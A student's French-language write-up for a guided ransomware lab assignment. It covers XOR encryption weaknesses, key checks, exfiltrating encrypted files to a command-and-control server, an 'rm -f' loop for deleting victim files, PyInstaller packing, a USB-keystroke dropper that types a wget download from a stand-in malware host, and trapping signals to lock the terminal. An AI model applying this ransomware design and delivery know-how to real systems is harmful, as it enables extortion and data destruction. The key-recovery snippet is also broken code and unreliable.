# Antoine Goulin - TP Ransomware

## Introduction

Ce devoir consiste en l'élaboration guidée d'un ransomware (programme malveillant chiffrant les fichiers d'un système, voire pire, demandant une rançon aux victimes contre la restauration de leurs données) Les fonctionnalités seront détaillées dans les paragraphes suivants. S'y ajouteront des notes complémentaires sur ce que j'aurais voulu ajouter, en eus-je pris le temps plus tôt. 
À l'instar des commentaires présents dans les autres documents de ce dépôt, tous on été écrits en anglais par souci d'homogénéité et de cohérence.

## Corps du ransomware

### Chiffrement

**Q1** : L'algorithme est le chiffrement XOR. Il est peu robuste car les bits de sa clé sont répétés de manière cyclique. Cependant, même sans une clé cyclique, l'opération mathématique du XOR est extrêmement simple donc il est possible de trouver la clé de chiffrement si l'on dispose d'un fichier clair et de sa version chiffrée (ce que des backups permettent inmanquablement).
Il serait plus efficace d'utiliser un chiffrement robuste, comme les variantes de l'AES pour s'assurer que personne ne puisse retrouver ses données sans notre intervention mais je ne suis pas allé jusque là dans les démarches détaillées dans [bonus chiffrement](#amélioration-du-chiffrement)

**Q2** : Utiliser un HMAC permettrait de s'assurer qu'un message est authentique mais ne suffirait pas à garantir la sécurité du chiffrement du fichier (sans compter la non-robustesse du XOR). Hacher la clé et le sel ensemble brouillerait beaucoup moins la clé dans le token généré. De plus, la clé de chiffrement n'étant pas stockée dans l'ordinateur de la victime, il serait difficile de s'assurer que la clé saisie par cette dernière est authentique (à moins bien sûr de la récupérer depuis le CNC, la rendant interceptible pendant l'échange). Ainsi, il est préférable de dériver la clé et le sel pour que le lien token-clé soit plus difficile à établir pour la vicitme (qui connaît déjà potentiellement le token et le sel)

### Setup

**Q3** : Il est préférable de vérifier qu'un token n'est pas déjà sauvegardé pour ne pas le remplacer par un autre token, ce qui aurait pour effet de rendre le déchiffrement impossible (impossible d'associer la clé saisie par l'utilisateur à un jeton authentique).

### Vérification de l'authenticité de la clé

**Q4** : pour vérifier que la clé est bonne, il suffit de calculer un token candidat en dérivant la clé saisie et le sel authentique puis de comparer ce jeton au jeton authentique. Si les deux jetons sont les mêmes, alors la clé saisie est correcte. 

## Bonus

### Vol de fichiers

**B1** : Pour voler les fichiers, on peut lire les données de chaque fichier chiffré, les convertir en base 64 et les récupérer sur le CNC. De plus amples explications sont données dans les commentaires du code de la fonction leak_files. J'ai décidé de transmettre les données dans un JSON mais il est possible de les envoyer octet par octet dans un flux continu pour chaque fichier.
J'ai fait le choix d'envoyer les fichiers après leur chiffrement puisque le serveur CNC dispose de tous les éléments nécessaires pour les déchiffrer. D'autant plus que les données envoyées en clair seraient perceptibles dans l'absolu (bien que la victime n'en aie pas le temps dans notre situation).
Enfin, en ajoutant les lignes suivantes, il serait simple de supprimer les fichers de la victime de son ordinateur, en espérant qu'elle n'ait pas fait de sauvegarde intégrale de son ordinateur. 
```py
# soit files_to_encrypt la liste des fichiers trouvés par le ransomware, à chiffrer
for file_to_delete in files_to_encrypt:
    os.system(f"rm -f {file_to_delete}")
```

Il me semble pertinent de préciser que pendant mes test, j'ai remarqué que les fichiers provenant du répertoire `/etc` étaient protégés, même pour l'utilisateur root (du moins avec les scripts que j'ai écrits), ce que montrait mon incapacité à chiffrer `/etc/X11/rgb.txt`.

### Amélioration du chiffrement

**B2** : La clé utilisée pour le XOR étant cyclique, il est possible de connaître la clé en compaprant un fichier sain avec un fichier chiffré. 
Donnée ^ Clé = Chiffré ; Chiffré ^ Clé = Donnée
Data ^ Chiffré = Clé
Ainsi, un script permettant de trouver la clé du chiffrement serait aussi simple que :
```py
with open(clear_file as c):
    clear_data = c.read()
with open(encrypted_data as e):
    encrypted_data = e.read()
key = clear_data ^ encrypted_data

logging.info(key)
```

**B3** : La bibliothèque cryptography nous offre d'autres options de chiffrement. La plus simple et sécurisée d'entre elles (pour un développeur junior comme nous) est le module Fernet, qui permet de chiffrer symétriquement et retourne un token unique permettant de vérifier l'authenticité du message.
Malgré leur plus grande sensibilité, il est également possible d'utiliser les fonctions comme AESxxx de cryptography.hazmat pour un contrôle plus fin des paramètres cryptographiques.

### Packer

**B4** : avec PyInstaller, il faut utiliser la commande `pyinstaller source/ransomware.py --onefile` depuis notre ordinateur ou `pyinsatller root/ransomware/ransomware.py --onefile` depuis le container (ce que je devais faire pour des raisons de compatibilité, _I use Arch, btw..._)

**B5** : le binaire créé se trouve dans dist/, monté dans root/bin dans le container

### Dropper

Je n'ai pas pris le temps de travailler sur un dropper depuis le CNC mais je souhaite mentionner un usage différent. Il peut être intéressant de songer à l'utilisation d'un _Rubber Ducky_ pour déposer le ransomware sur l'ordinateur d'une victime au sein d'une entreprise. Bien que dans notre cas, cette solution puisse surtout servir à la première entrée dans le système d'une grande structure, nous servant ensuite de levier pour nous infiltrer numériquement, la simplicité d'une clé USB malveillante que l'un des employés trouverait sur le pare-brise de sa voiture ou à un autre endroit inattendu serait dévastatrice.

Pour tester ce genre de méthode, il est possible de se servir de la clé Digispark (ATtiny85 embarqué sur une clé USB), capable de se faire passer pour un clavier et de saisir les touches suffisantes pour ouvrir un terminal et y inscrire `wget https://bonpetitmalware.com/ransomwarepaspiquedeshannetons` en moins de trente secondes.

### Messages de pression

#### Bloquer le terminal

J'aimerais noter ici que, pour bloquer le terminal, il faut au moins capturer les signaux `SIGINT` (interruption précipitée d'un service en cours d'éxecution, déclenchée par la combinaison Ctrl + C) et `SIGTERM` (indication au programme qu'il doit s'arrêter) et indiquer au malware de les ignorer (ce qui se fait au tout début du programme). Il est impossible d'ignorer le signal `SIGKILL`, dont l'effet est d'arrêter un programme de force. Cependant, cela ne suffit pas à ignorer le Ctrl + D, qui abrège l'exécution du programme en lui indiquant qu'il a atteint la dernière ligne de son script. Pour pallier ce problème, il est possible de traiter l'exception du `EOFError` avec un try/except et d'indiquer que si l'exception se produit, on relance la fonction en cours (dans une boucle while par exemple - avec l'instruction continue).